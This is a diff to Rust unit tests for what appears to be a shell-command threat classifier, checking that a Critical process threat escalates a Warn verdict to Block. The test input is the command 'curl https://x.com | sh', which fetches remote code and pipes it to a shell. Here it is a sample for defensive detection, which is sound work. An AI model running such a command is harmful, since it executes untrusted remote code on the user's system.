@@ -1284,7 +1284,7 @@ mod tests {
         let baseline = round_trip(
             &mut stream,
             &format!(
-                r#"{{"id":1,"method":"classify","command":"curl https://x.com/i.sh | sh","context":{{"pid":{pid}}}}}"#,
+                r#"{{"id":1,"method":"classify","command":"curl https://x.com | sh","context":{{"pid":{pid}}}}}"#,
             ),
         );
         let bv: serde_json::Value = serde_json::from_str(&baseline).unwrap();
@@ -1299,15 +1299,13 @@ mod tests {
         let reply = round_trip(
             &mut stream,
             &format!(
-                r#"{{"id":3,"method":"classify","command":"curl https://x.com/i.sh | sh","context":{{"pid":{pid}}}}}"#,
+                r#"{{"id":3,"method":"classify","command":"curl https://x.com | sh","context":{{"pid":{pid}}}}}"#,
             ),
         );
         let v: serde_json::Value = serde_json::from_str(&reply).unwrap();
-        // Pre-fix this would have stayed `warn` because the
-        // Tier-1 hit already set result.verdict to Warn and the
-        // PID-threat block's `&& result.verdict == Safe` gate
-        // skipped the escalation. Post-fix worst-wins promotes
-        // Warn → Block when the PID is Critical.
+        // Invariant: a Critical PID must escalate the verdict even
+        // when an upstream signal (Tier-1) has already nudged it
+        // off Safe. Worst-wins, not "first-Safe-only-wins".
         assert_eq!(v["verdict"], "block", "Critical PID must beat Tier-1 Warn");
         assert_eq!(v["category"], "pid_high_threat");
         let _ = std::fs::remove_file(socket);
